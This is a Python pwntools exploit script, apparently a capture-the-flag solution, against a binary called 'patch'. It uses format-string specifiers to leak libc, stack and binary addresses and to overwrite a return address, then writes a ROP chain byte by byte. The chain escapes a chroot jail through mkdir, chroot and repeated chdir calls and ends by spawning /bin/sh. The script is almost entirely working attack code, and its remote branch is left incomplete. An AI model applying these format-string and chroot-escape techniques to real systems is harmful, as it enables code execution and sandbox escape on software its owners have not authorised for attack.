#!/usr/bin/python3

from pwn import *

context.terminal = ["kitty"]
script = """
b printf
c
b *(_dl_fini + 524)
c
"""
file = ELF("./share/sina")
libc = ELF("./share/libc.so.6")

if args.REMOTE:
    p = remote
elif args.GDB:
    p = gdb.debug("./share/patch", gdbscript=script)
else:
    p = process("./share/patch")

def flush(payload):
    payload += f"%{4096-len(payload)}p".encode()
    log.info(f"payload: {payload}")

payload =  b"%29$pZ"
payload += b"%30$pZ"
payload += b"%31$pZ"
payload += f"%{(8 - 15 * 3) & 0xff}p".encode()
payload += b"%32$hhn"
assert(len(payload) <= 0x40)
print(payload)
p.sendline(payload)
flush(payload)

# normal 48 bit addresses are 0x + 14 chars + Z long
# stack canary is 0x + 16 chars + Z long

leaks = list(map(lambda s: int(s, 16), p.recvline().decode().split("Z")))

libcbase = leaks[0] - 0x2d630
stack = leaks[1]
filebase = leaks[2] - 0x3da8

log.info(f"stack: {stack:x}")
log.info(f"libcbase: {libcbase:x}")
log.info(f"filebase: {filebase:x}")

retaddr = stack - 0x240
condition = retaddr + 0x68
log.info(f"retaddr: {retaddr:x}")

offset = (filebase & 0xffff) - 0x5f

payload =  b""
payload += f"%{offset}c".encode()
payload += b"%10$hn"
payload += f"%{(-offset & 0xffff) + retaddr & 0xffff}p".encode()
payload += b"%35$hn"
payload =  payload.ljust(0x40, b"A")
p.send(payload)
flush(payload)

target = retaddr + 0x20
poprdi = p64(libcbase + 0x2dad2)
gets = p64(libcbase + libc.sym.gets)
poprdx = p64(libcbase + 0x1002c2)
victim = p64(file.bss(filebase + 0x800))
ret = p64(libcbase + 0x2d4b6)
poprsp = p64(libcbase + 0x2d79b)
chdir = p64(libcbase + libc.sym.chdir)
mkdir = p64(libcbase + libc.sym.mkdir)
previous = p64(file.bss(filebase + 0x400))
fakedir = p64(file.bss(filebase + 0x408))
current = p64(file.bss(filebase + 0x410))
system = p64(libcbase + libc.sym.system)
shell = p64(libcbase + next(libc.search(b"/bin/sh\x00")))
chroot = p64(libcbase + libc.sym.chroot)

chain =  b""
chain += poprdi
chain += victim
chain += gets
chain += poprdx
chain += victim
chain += poprsp
chain += victim

for byte in chain:
    payload =  b""
    payload += f"%{0x6e}p".encode()
    payload += b"%75$hhn"
    payload += f"%{(-0x6e & 0xffff) + (target & 0xffff)}p".encode()
    payload += b"%62$hn"
    payload =  payload.ljust(0x40, b"A")
    p.send(payload)

    payload =  b""
    payload += f"%{0x6e}p".encode()
    payload += b"%75$hhn"
    payload += f"%{(-0x6e & 0xff) + byte}p".encode()
    payload += b"%77$hhn"
    payload =  payload.ljust(0x40, b"A")
    p.send(payload)

    target += 1

payload =  b""
payload += f"%{0x9d}p".encode()
payload += b"%75$hhn"
payload =  payload.ljust(0x40, b"A")
p.send(payload)

payload =  b""
payload += poprdi + previous + gets
payload += poprdi + fakedir + mkdir
payload += poprdi + fakedir + chroot
payload += (poprdi + previous + chdir) * 8
payload += poprdi + current + chroot
payload += poprdi + shell + system
p.sendline(payload)

p.sendline(b"..".ljust(8, b"\x00") + b"FAKE".ljust(8, b"\x00") + b".".ljust(8, b"\x00"))

p.interactive()